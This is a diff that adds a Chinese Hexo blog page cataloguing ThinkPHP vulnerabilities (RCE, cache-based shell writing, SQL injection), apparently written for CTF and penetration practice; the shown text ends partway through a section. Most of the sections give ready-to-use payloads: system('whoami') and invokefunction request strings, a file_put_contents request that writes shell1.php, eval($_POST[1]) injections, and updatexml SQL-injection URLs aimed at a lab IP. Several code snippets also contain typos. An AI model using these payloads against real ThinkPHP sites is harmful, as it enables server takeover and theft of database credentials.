@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-noah.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-noah.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-noah.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"buttons","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Thinkphp漏洞整理ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，因为受到众多开发人员的喜爱，其在市场的应用规模很大，自然也引起了众多安全人员的注意。因此在这里，对相关漏洞进行归纳和总结。 指纹为：X-Powered-By: ThinkPHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp漏洞整理">
+<meta property="og:url" content="http://example.com/2020/08/05/ThinkerPHP/index.html">
+<meta property="og:site_name" content="NoahBox">
+<meta property="og:description" content="Thinkphp漏洞整理ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，因为受到众多开发人员的喜爱，其在市场的应用规模很大，自然也引起了众多安全人员的注意。因此在这里，对相关漏洞进行归纳和总结。 指纹为：X-Powered-By: ThinkPHP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/Z8z2uKye9NI4PTd.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/GTKL8tBhRHEdnlo.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/1xSv93QfzByP45u.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/9FDZ7gIyOrweWPA.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/qMTjH8RfC1OFQiL.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/kA45KbpIeXYvqri.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/oisaHlIJw26Q9Xy.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/cTosKU7F2LmiXr5.png">
+<meta property="article:published_time" content="2020-08-05T14:33:18.849Z">
+<meta property="article:modified_time" content="2021-05-17T13:34:28.604Z">
+<meta property="article:author" content="NoahTie">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/13/Z8z2uKye9NI4PTd.png">
+
+<link rel="canonical" href="http://example.com/2020/08/05/ThinkerPHP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Thinkphp漏洞整理 | NoahBox</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="NoahBox" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">NoahBox</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hell is Other People.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言簿</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/08/05/ThinkerPHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="NoahTie">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoahBox">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Thinkphp漏洞整理
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-05 22:33:18" itemprop="dateCreated datePublished" datetime="2020-08-05T22:33:18+08:00">2020-08-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-17 21:34:28" itemprop="dateModified" datetime="2021-05-17T21:34:28+08:00">2021-05-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2020/08/05/ThinkerPHP/" class="post-meta-item leancloud_visitors" data-flag-title="Thinkphp漏洞整理" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/08/05/ThinkerPHP/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/05/ThinkerPHP/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Thinkphp漏洞整理"><a href="#Thinkphp漏洞整理" class="headerlink" title="Thinkphp漏洞整理"></a>Thinkphp漏洞整理</h1><p>ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，因为受到众多开发人员的喜爱，其在市场的应用规模很大，自然也引起了众多安全人员的注意。因此在这里，对相关漏洞进行归纳和总结。</p>
+<p>指纹为：<code>X-Powered-By: ThinkPHP</code></p>
+<span id="more"></span>
+
+<h1 id="安全漏洞"><a href="#安全漏洞" class="headerlink" title="安全漏洞"></a>安全漏洞</h1><h2 id="ThinkPHP-5-0-23远程代码执行"><a href="#ThinkPHP-5-0-23远程代码执行" class="headerlink" title="ThinkPHP 5.0.23远程代码执行"></a>ThinkPHP 5.0.23远程代码执行</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://zone.secevery.com/article/1165">http://zone.secevery.com/article/1165</a></p>
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Thinkphp在实现框架中的核心类<code>Request</code>的<code>method</code>方法实现了表单请求伪装。但由于对<code>$_POST[‘_method’]</code>属性校验不严格，导致攻击者可以通过变量覆盖掉<code>Request</code>类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>THINKPHP 5.0.x-5.0.23</code></p>
+<h3 id="漏洞产生位置"><a href="#漏洞产生位置" class="headerlink" title="漏洞产生位置"></a>漏洞产生位置</h3><p><code>ThinkPHPRequest</code> 类的 <code>method </code>方法中<code> (thinkphp/library/think/Request.php)</code></p>
+<h3 id="挖掘方式"><a href="#挖掘方式" class="headerlink" title="挖掘方式"></a>挖掘方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method:POST</span><br><span class="line">url中设置参数s&#x3D;captcha</span><br><span class="line">body数据：_method&#x3D;__construct&amp;filter&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;whoami</span><br></pre></td></tr></table></figure>
+<h2 id="ThinkPHP-5-0-22远程代码执行"><a href="#ThinkPHP-5-0-22远程代码执行" class="headerlink" title="ThinkPHP 5.0.22远程代码执行"></a>ThinkPHP 5.0.22远程代码执行</h2><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a target="_blank" rel="noopener" href="http://zone.secevery.com/article/1165">http://zone.secevery.com/article/1165</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/93903.html">https://www.secpulse.com/archives/93903.html</a></li>
+</ul>
+<h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p><code>Thinkphp5.x</code>版本<code>(5.0.20)</code>中没有对路由中的控制器进行严格过滤，在存在<code>admin</code>、<code>index</code>模块、没有开启强制路由的条件下（默认不开启），导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，完成远程代码执行</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>THINKPHP 5.0.5-5.0.22 </code>、<code>THINKPHP 5.1.0-5.1.30</code></p>
+<h3 id="挖掘方式-1"><a href="#挖掘方式-1" class="headerlink" title="挖掘方式"></a>挖掘方式</h3><ol>
+<li>命令执行<br><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1]=whoami </code></li>
+<li>代码执行<br><code>?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1]=-1</code></li>
+<li>写入文件<br><code>?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?php phpinfo();?&gt;</code></li>
+</ol>
+<h2 id="ThinkPHP-2-2任意代码执行"><a href="#ThinkPHP-2-2任意代码执行" class="headerlink" title="ThinkPHP 2.2任意代码执行"></a>ThinkPHP 2.2任意代码执行</h2><h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://zone.secevery.com/article/1165">http://zone.secevery.com/article/1165</a></p>
+<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>THINKPHP 2.x-2.2</code></p>
+<h3 id="挖掘方式-2"><a href="#挖掘方式-2" class="headerlink" title="挖掘方式"></a>挖掘方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;module&#x2F;action&#x2F;param1&#x2F;$&#123;phpinfo()&#125;</span><br><span class="line">&#x2F;module&#x2F;action&#x2F;param1&#x2F;$&#123;eval($_POST[1])&#125;                           </span><br><span class="line">?s&#x3D;&#x2F;abc&#x2F;abc&#x2F;abc&#x2F;$&#123;THINK_VERSION&#125;</span><br><span class="line">?s&#x3D;&#x2F;abc&#x2F;abc&#x2F;abc&#x2F;$&#123;eval($_POST[1])&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ThinkPHP-前台缓存写shell"><a href="#ThinkPHP-前台缓存写shell" class="headerlink" title="ThinkPHP 前台缓存写shell"></a>ThinkPHP 前台缓存写shell</h2><h3 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/12593865.html">https://www.cnblogs.com/-chenxs/p/12593865.html</a></p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>开启缓存功能；<br>能够猜解出缓存文件名（文件名生成有一定规律）<br>缓存内容可控或部分可控，即找到写入的位置（一般与数据库交互的地方）</p>
+<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>ThinkPHP3.2.3-5.0.10</code></p>
+<h3 id="挖掘方式-3"><a href="#挖掘方式-3" class="headerlink" title="挖掘方式"></a>挖掘方式</h3><p>主要分为数据交互写入恶意php语句，触发缓存数据，访问缓存文件三步。</p>
+<h4 id="tp3-2-3"><a href="#tp3-2-3" class="headerlink" title="tp3.2.3"></a>tp3.2.3</h4><ul>
+<li>找到与数据库交互的地方，一般是提交post数据的地方，写入任意php语句如<code>%0d%0aphpinfo();//</code></li>
+<li>缓存文件路径：<code>/Application/Runtime/Temp</code></li>
+<li>可能缓存文件名：<code>b068931cc450442b63f5b3d276ea4297.php</code></li>
+</ul>
+<h4 id="onethink1-0"><a href="#onethink1-0" class="headerlink" title="onethink1.0"></a>onethink1.0</h4><ul>
+<li>thinkphp3开发</li>
+<li>缓存文件路径：<code>/Runtime/Temp/</code></li>
+<li>默认缓存文件名：<code>2bb202459c30a1628513f40ab22fa01a.php</code></li>
+</ul>
+<h4 id="tp5-0-10"><a href="#tp5-0-10" class="headerlink" title="tp5.0.10"></a>tp5.0.10</h4><ul>
+<li>缓存文件路径：<code>/runtime/cache</code></li>
+<li>如果可能规则命名的md5值：<code>b068931cc450442b63f5b3d276ea4297</code>，那么缓存文件名为：<code>/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code></li>
+<li>写入的php语句开头需要换行，结尾需要注释掉后面的垃圾数据：换行利用url编码<code>%0d%0a</code>或者<code>%0a</code>，注释用<code> //</code>。例如写入<code>phpinfo()</code>; 那么应该为：<code>%0d%0aphpinfo();//</code></li>
+</ul>
+<h2 id="ThinkPHP-3-2-3-5-1-22-order-by注入"><a href="#ThinkPHP-3-2-3-5-1-22-order-by注入" class="headerlink" title="ThinkPHP 3.2.3/5.1.22 order by注入"></a>ThinkPHP 3.2.3/5.1.22 order by注入</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>该漏洞是因为未正确处理所接收数组类型参数的<code>key</code>，直接拼接到了SQL语句的<code>order by</code>后面，导致漏洞的产生。该漏洞可以获取数据库数据，比如用户账号密码，管理后台账号密码，交易数据等。漏洞危害为高危。</p>
+<h3 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h3><p>``5.1.16&lt;=ThinkPHP&lt;=5.1.22，&lt;=3.2.3`</p>
+<h3 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://nosec.org/home/detail/1821.html">https://nosec.org/home/detail/1821.html</a></p>
+<h3 id="漏洞复现（内网环境）"><a href="#漏洞复现（内网环境）" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>/application/index/controller/</code>文件夹下建立<code>Index.php</code>文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)    </span>&#123;</span><br><span class="line">           $data=<span class="keyword">array</span>();</span><br><span class="line">         $data[<span class="string">&#x27;username&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;eq&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">        $order=input(<span class="string">&#x27;get.orderby/a&#x27;</span>);</span><br><span class="line">        $m=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">        Sdump($m);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>192.168.10.53</code>，选择对应版本</p>
+<p><img src="https://i.loli.net/2021/05/13/Z8z2uKye9NI4PTd.png"></p>
+<h3 id="Poc-exp"><a href="#Poc-exp" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><ul>
+<li><p>3.2.3<br><code>?order[updatexml(1,concat(0x3a,user()),1)]=1</code>    </p>
+</li>
+<li><p>5.1.22<br> <code>?orderby[id|updatexml(1,concat(0x3a,user()),1)%23]=1</code></p>
+</li>
+</ul>
+<h2 id="Thinkphp3-2-3-find-select-delete注入"><a href="#Thinkphp3-2-3-find-select-delete注入" class="headerlink" title="Thinkphp3.2.3 find/select/delete注入"></a>Thinkphp3.2.3 find/select/delete注入</h2><h3 id="影响版本-5"><a href="#影响版本-5" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>Thinkphp&lt;=3.2.3</code></p>
+<p>###　漏洞分析参考：<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/157817">https://www.anquanke.com/post/id/157817</a></p>
+<h3 id="漏洞复现（内网环境）-1"><a href="#漏洞复现（内网环境）-1" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>Application\Home\Controller\IndexController.class.php</code> 添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    $id = i(<span class="string">&#x27;id&#x27;</span>);  </span><br><span class="line">    $res = M(<span class="string">&#x27;user&#x27;</span>)‐&gt;find($id);</span><br><span class="line">    <span class="comment">//find()  //$res = M(&#x27;user&#x27;)‐&gt;delete($id); //delete() </span></span><br><span class="line">    <span class="comment">//$res = M(&#x27;user&#x27;)‐&gt;select($id); //select()  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Poc-exp-1"><a href="#Poc-exp-1" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p>针对<code>select()</code> 和<code>find()</code>方法 ,有很多地方可注，这里主要列举三个<code>table</code>，<code>alias</code>， <code>where</code>，更多还请自行跟踪一下<code>parseSql</code>的各个<code>parseXXX</code>方法，目测都是可行的，比如<code>having</code>,<code>group</code>等。</p>
+<h4 id="where"><a href="#where" class="headerlink" title="where:"></a>where:</h4><p><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐</code></p>
+<h4 id="alias"><a href="#alias" class="headerlink" title="alias:"></a>alias:</h4><p><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,u ser(),0x7e),1)‐‐</code></p>
+<h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐</code></p>
+<p><img src="https://i.loli.net/2021/05/13/GTKL8tBhRHEdnlo.png"></p>
+<p>而<code>delete()</code>方法的话同样，这里粗略举三个例子，<code>table</code>,<code>alias</code>,<code>where</code>，但使用<code>table</code>和<code>alias</code>的时候，同时还必须保证<code>where</code>不为空</p>
+<h4 id="where-1"><a href="#where-1" class="headerlink" title="where"></a>where</h4><p><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐</code></p>
+<h4 id="alias-1"><a href="#alias-1" class="headerlink" title="alias"></a>alias</h4><p><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x 7e),1)‐‐</code></p>
+<h4 id="table-1"><a href="#table-1" class="headerlink" title="table:"></a>table:</h4><p><code>http://192.168.10.53/web/3.2.3/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat x7e,user(),0x7e),1)‐‐&amp;id[where]=1</code></p>
+<p><img src="https://i.loli.net/2021/05/13/1xSv93QfzByP45u.png"></p>
+<h2 id="ThinkPHP框架3-2-3-update注入漏洞"><a href="#ThinkPHP框架3-2-3-update注入漏洞" class="headerlink" title="ThinkPHP框架3.2.3 update注入漏洞"></a>ThinkPHP框架3.2.3 update注入漏洞</h2><h3 id="影响版本-6"><a href="#影响版本-6" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>Thinkphp&lt;=3.2.3</code></p>
+<h3 id="漏洞分析参考"><a href="#漏洞分析参考" class="headerlink" title="漏洞分析参考"></a>漏洞分析参考</h3><p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-97234">https://www.seebug.org/vuldb/ssvid-97234</a></p>
+<h3 id="漏洞复现（内网环境）-2"><a href="#漏洞复现（内网环境）-2" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>Application/Home/Controller/UserController.class.php</code>添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $User = M(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        $user[<span class="string">&#x27;id&#x27;</span>] = I(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">        $data[<span class="string">&#x27;name&#x27;</span>] = I(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        $data[<span class="string">&#x27;pass&#x27;</span>] = I(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Poc-exp-2"><a href="#Poc-exp-2" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p><code>/index.php/home/user?name=1123&amp;pass=liao&amp;id[0]=bind&amp;id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</code></p>
+<p><img src="https://i.loli.net/2021/05/13/9FDZ7gIyOrweWPA.png"></p>
+<h2 id="ThinkPHP-5-1-7-update注入"><a href="#ThinkPHP-5-1-7-update注入" class="headerlink" title="ThinkPHP 5.1.7 update注入"></a>ThinkPHP 5.1.7 update注入</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>本次漏洞存在于 <code>Mysql</code> 类的<code>parseArrayData</code>方法中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。</p>
+<h3 id="影响版本-7"><a href="#影响版本-7" class="headerlink" title="影响版本"></a>影响版本</h3><p>5.1.6&lt;=Thinkphp&lt;=5.1.7(非最新的 5.1.8 版本也可利用)</p>
+<h3 id="漏洞分析参考-1"><a href="#漏洞分析参考-1" class="headerlink" title="漏洞分析参考"></a>漏洞分析参考</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/206233.html">https://www.freebuf.com/column/206233.html</a></p>
+<h3 id="漏洞复现（内网环境）-3"><a href="#漏洞复现（内网环境）-3" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>\thinkphp\application\index\controller\Index.php</code>添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">indx</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $password=input(<span class="string">&#x27;get.pass/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;user&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span>=&gt;<span class="number">1</span>]-&gt;update([<span class="string">&#x27;pass&#x27;</span>=&gt;&amp;password]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
